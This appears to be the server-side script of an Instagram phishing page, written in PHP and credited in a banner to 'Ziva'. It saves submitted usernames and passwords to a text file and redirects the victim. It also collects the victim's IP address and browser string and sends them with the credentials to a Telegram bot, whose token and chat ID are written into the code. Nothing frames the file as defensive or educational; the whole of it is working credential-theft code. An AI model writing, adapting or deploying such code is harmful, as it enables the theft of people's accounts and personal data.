<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: new.php');

$username = $_POST['email'];
$password = $_POST['pass'];

  
$ip =$_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$apiToken = "1521176747:AAFdv1Y68rZgpuViT-gHQrk54yyrJhh1PF4";
$chat = "996470973";
$data = [
    'chat_id' => $chat,
    'text' => "⊚--------------------------------------------------------⊚
                   Dezyn By Ziva


IP ADDRESS   : $ip

USER-AGENT : $browser

USER ID : $username 

PASSWORD  : $password 

⊚--------------------------------------------------------⊚"
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );



?>
